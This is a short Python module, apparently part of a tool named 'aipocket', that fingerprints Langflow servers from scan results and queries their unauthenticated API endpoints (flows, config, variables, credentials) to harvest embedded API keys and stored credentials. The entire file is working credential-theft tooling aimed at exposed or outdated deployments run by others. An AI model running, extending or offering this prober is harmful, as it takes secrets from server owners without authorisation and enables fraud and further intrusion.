"""Langflow prober — public flow configs + unauthenticated reads.

Langflow < 1.5.0 has many endpoints that don't require auth (or only need
auto_login enabled). Key extraction targets:
  - GET /api/v1/flows → flow definitions with embedded API keys in nodes
  - GET /api/v1/config → server config
  - GET /api/v1/variables → stored variables (may contain credentials)
"""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential
from ..base import Prober

log = logging.getLogger(__name__)


class LangflowProber(Prober):
    product_name = "langflow"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "langflow" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        creds = []

        # Unauthenticated endpoints — many Langflow instances have auto_login or
        # no auth configured at all (especially dev/demo deployments).
        for path in (
            "/api/v1/flows",          # flow definitions — nodes embed API keys
            "/api/v1/config",         # server configuration
            "/api/v1/variables",      # stored variables (credentials)
            "/api/v1/credentials",    # credential components
            "/api/all-flows",         # some versions expose this
        ):
            resp = await self._get(self._url(hit, path))
            found = self._extract_from_response(resp, hit, f"langflow_{path.strip('/').replace('/', '_')}")
            creds.extend(found)

        return creds
